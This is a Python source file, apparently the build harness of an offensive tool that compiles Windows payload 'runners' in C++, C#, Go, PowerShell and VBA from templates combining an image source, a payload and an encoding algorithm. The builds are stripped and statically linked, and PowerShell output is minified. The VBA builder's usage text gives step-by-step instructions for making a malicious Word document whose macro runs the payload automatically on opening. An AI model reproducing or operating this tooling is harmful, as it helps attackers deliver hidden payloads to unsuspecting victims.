import json
import os.path
import subprocess
from collections import defaultdict
from dataclasses import dataclass, field
from typing import Union

import chevron
from colorama import Style, Fore
from textwrap import dedent
from yaml import safe_load
from loguru import logger

from src.ps_minifier import minify_PS

RUN_DIR = os.getcwd()
MYASO_DIR = os.path.dirname(os.path.dirname(__file__))


@dataclass
class Runner:
    """Payload runner. Used as a config for Builder"""
    name: str
    arch: str

    language: str
    image_source: str
    payload: str
    algorithm: str

    params: dict = field(default_factory=dict)

    @classmethod
    def from_file(cls, filename: str):
        with open(filename) as f:
            return cls(**safe_load(f))

    @property
    def sources_dir(self):
        source_dir_map = {
            'c++': 'cpp',
            'c#': 'csharp',
            'go': 'go',
            'powershell': 'powershell',
            'vba': 'vba',
        }
        return os.path.join('runners', source_dir_map[self.language.lower()])

    def __str__(self):
        return f'{self.name} (windows/{self.arch}/{self.language}/{self.payload}, ' \
               f'algorithm={self.algorithm}, params={self.params})'


def get_runner(runner_config: Union[str, dict], **kwargs):
    if isinstance(runner_config, str):
        runner = Runner.from_file(runner_config)
    elif isinstance(runner_config, dict):
        runner = Runner(**runner_config)
    else:
        raise TypeError('runner_config must be either str or dict')

    builder = Builder.from_runner(runner)

    logger.success('Builder configured')
    logger.debug(f'Configuration: {runner}')
    if builder.build():
        logger.artifact(f'Runner is at {Fore.RED}{builder.artifact_path}{Style.RESET_ALL}')
        logger.info(builder.usage)


class Builder:
    """TODO"""
    sources_extension = ''
    build_extension = 'exe'
    build_dir = '.'

    CLASS_MAPPING_FILE = 'class_mapping.json'

    def __init__(self, runner: Runner):
        self.runner = runner

    @property
    def artifact_path(self) -> str:
        if self.runner.params.get('ARTIFACT_PATH'):
            return os.path.normpath(os.path.join(RUN_DIR, self.runner.params["ARTIFACT_PATH"]))

        return os.path.normpath(os.path.join(
            MYASO_DIR,
            self.runner.sources_dir,
            self.build_dir,
            f'{self.runner.name}.{self.build_extension}'
        ))

    @property
    def main_file(self):
        return f'runner.{self.sources_extension}'

    def build(self):
        old_cwd = os.getcwd()
        os.chdir(os.path.join(MYASO_DIR, self.runner.sources_dir))
        try:
            os.mkdir(self.build_dir)
        except FileExistsError:
            pass

        success = False
        try:
            os.chdir(self.build_dir)
            logger.debug('Preparing the sources...')
            self.preprocess_sources()

            logger.info('Starting the build...')
            self.run_build()
            logger.success('Build was successful!')
            success = True
        except Exception as e:
            logger.error('Build failed!')
            logger.error(rf'Reason: {e.__class__}, {e}')
        finally:
            os.chdir(old_cwd)

        return success

    def run_build(self):
        raise NotImplementedError

    @property
    def usage(self) -> str:
        return f'Usage: {self.runner.name}.{self.build_extension} PAYLOAD_SOURCE BYTE_LENGTH'


    def preprocess_sources(self):
        with open(f'{self.main_file}.mst') as template:
            sources = chevron.render(template, self.runner.params)
            with open(self.main_file, 'w') as f:
                f.write(sources)

    def add_class_map_to_template_arguments(self):
        with open(self.CLASS_MAPPING_FILE) as f:
            class_mapping = json.loads(f.read())

        self.runner.params.update({
            'image_source': class_mapping['image_sources'][self.runner.image_source],
            'payload': class_mapping['payloads'][self.runner.payload],
            'algorithm': self.runner.algorithm
        })

        try:
            args = self.runner.params['args']
            self.runner.params.update({
                'algorithm_args': args.get('algorithm'),
            })
        except KeyError:
            pass

    @classmethod
    def get_implementation(cls, language: str):
        implementations = {
            'c++': CppBuilder,
            'c#': CSharpBuilder,
            'go': GoBuilder,
            'powershell': PowershellBuilder,
            'vba': VbaBuilder,
        }
        try:
            return implementations[language.lower()]
        except KeyError:
            logger.error(f'Runner in {language} not found')
            exit(-1)

    @classmethod
    def from_runner(cls, runner: Runner):
        logger.debug('Finding you a template...')
        return cls.get_implementation(runner.language)(runner)


class CppBuilder(Builder):
    sources_extension = 'cpp'
    build_dir = 'cpp'
    compilers = {
        'x86': '/usr/bin/i686-w64-mingw32-g++',
        'x64': '/usr/bin/x86_64-w64-mingw32-g++'
    }
    libs = defaultdict(list, {
        'remote': ['winhttp', 'ole32'],
    })

    def preprocess_sources(self):
        self.add_class_map_to_template_arguments()
        super().preprocess_sources()

    def run_build(self):
        libs = ['gdiplus'] + self.libs[self.runner.image_source] + self.libs[self.runner.payload]
        libs = set(libs)
        libs = ' '.join(f'-l{lib} -Wl,-Bstatic' for lib in libs)
        cmd = (
            f'{self.compilers[self.runner.arch]} '
            f'{self.main_file} '
            f'-s -static-libgcc -static-libstdc++ '
            f'{libs} '
            f'-Wall '
            f'-municode '
            f'-o {self.artifact_path}'
        )
        logger.debug(os.getcwd())
        logger.debug(cmd)
        assert (o := subprocess.run(cmd, shell=True, capture_output=True)).returncode == 0, \
            b'\\n'.join([o.stdout, o.stderr]).decode("unicode_escape")


class CSharpBuilder(Builder):
    sources_extension = 'cs'
    build_dir = 'csharp'

    def preprocess_sources(self):
        self.add_class_map_to_template_arguments()
        super().preprocess_sources()

    def run_build(self):
        logger.debug(os.getcwd())
        cmd = (
            f'mcs -platform:{self.runner.arch} '
            f'/reference:System.Drawing '
            f'{self.main_file} '
            f'./Algorithms/* ./Payloads/* ./ImageSources/* '
            f'-out:'
            f'{self.artifact_path}'
        )
        logger.debug(cmd)
        assert (o := subprocess.run(cmd, shell=True, capture_output=True)).returncode == 0, (o.stdout, o.stderr)


class GoBuilder(Builder):
    build_dir = '.'
    sources_extension = 'go'
    architectures = {
        'x86': '386',
        'x64': 'amd64'
    }

    def preprocess_sources(self):
        self.add_class_map_to_template_arguments()
        super().preprocess_sources()

    def run_build(self):
        o = subprocess.run(
            f'go build -ldflags "-s -w" -o {self.artifact_path}',
            shell=True,
            env=os.environ.update({
                'GOARCH': self.architectures[self.runner.arch],
                'GOOS': 'windows'
            }),
            capture_output=True
        )
        if o.returncode:
            raise RuntimeError(o.stderr)


class PowershellBuilder(Builder):
    sources_extension = 'ps1'
    build_extension = sources_extension

    def preprocess_sources(self):
        with open(f'algorithms/{self.runner.algorithm.lower()}.{self.sources_extension}') as f:
            self.runner.params.update({'ALGORITHM_CODE': chevron.render(f.read(), self.runner.params)})

        with open(f'image_sources/{self.runner.image_source.lower()}.{self.sources_extension}') as f:
            self.runner.params.update({'IMAGE_SOURCE_CODE': chevron.render(f.read(), self.runner.params)})

        with open(f'payloads/{self.runner.payload.lower()}.{self.sources_extension}') as f:
            self.runner.params.update({'PAYLOAD_CODE': chevron.render(f.read(), self.runner.params)})

        super().preprocess_sources()

        with open(self.main_file, 'r') as f:
            script = f.read()

        with open(self.artifact_path, 'w') as f:
            f.write(minify_PS(script))

        os.remove(self.main_file)

    def run_build(self):
        pass


class VbaBuilder(Builder):
    sources_extension = 'vba'
    build_extension = sources_extension

    def preprocess_sources(self):
        with open(f'algorithms/{self.runner.algorithm.lower()}.{self.sources_extension}') as f:
            self.runner.params.update({'ALGORITHM_CODE': chevron.render(f.read(), self.runner.params)})

        with open(f'arches/{self.runner.arch.lower()}.{self.sources_extension}') as f:
            self.runner.params.update({'ARCH_IMPORTS': chevron.render(f.read(), self.runner.params)})

        with open(f'payloads/{self.runner.payload.lower()}_{self.runner.arch.lower()}.{self.sources_extension}') as f:
            self.runner.params.update({'PAYLOAD_CODE': chevron.render(f.read(), self.runner.params)})

        super().preprocess_sources()

        with open(self.main_file, 'r') as f:
            script = f.read()

        # TODO: VBA obfuscator
        with open(self.artifact_path, 'w') as f:
            f.write(script)

        os.remove(self.main_file)

    def run_build(self):
        pass

    @property
    def usage(self) -> str:
        return f"""Manually create malicious document in the following steps:
    1. Open Microsoft Word and create a new 1997-2003 Word document (.doc) file.
    2. Copy the generated payload picture in the document body.
    3. Follow "View" -> "Macros" -> "Create" menu options to create a VBA script in editor.
    4. Paste the runner code from {self.runner.name}.{self.build_extension} into the editor.
    5. Save the editor and exit the Word application.
    6. Payload should automatically be run upon opening the document."""